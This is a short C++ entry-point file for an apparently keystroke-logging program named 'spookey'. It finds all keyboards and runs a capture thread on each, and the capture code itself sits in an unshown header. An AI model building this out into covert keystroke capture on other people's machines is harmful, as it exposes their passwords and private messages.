#include <string>
#include <vector>
#include <pthread.h>
#include "spookey.hh"

int main(int argc, char** argv) {
    // Parse command-line arguments
    for(int i=0; i < argc; i++) {
        if(strcmp(argv[i], "--debug") == 0) DEBUG = true;
    }

    // Find keyboards
    std::vector<Keyboard> keyboards = findKeyboards();
    int numKeyboards = keyboards.size();

    // Begin capturing keystrokes
    for (int i=0; i < numKeyboards; ++i) {
        keyboards[i].capture();
    }

    // Do not exit while captures are running
    for (int i=0; i < numKeyboards; ++i) {
        pthread_join(keyboards[i].getCaptureThread(), nullptr);
    }

    return 0;
}
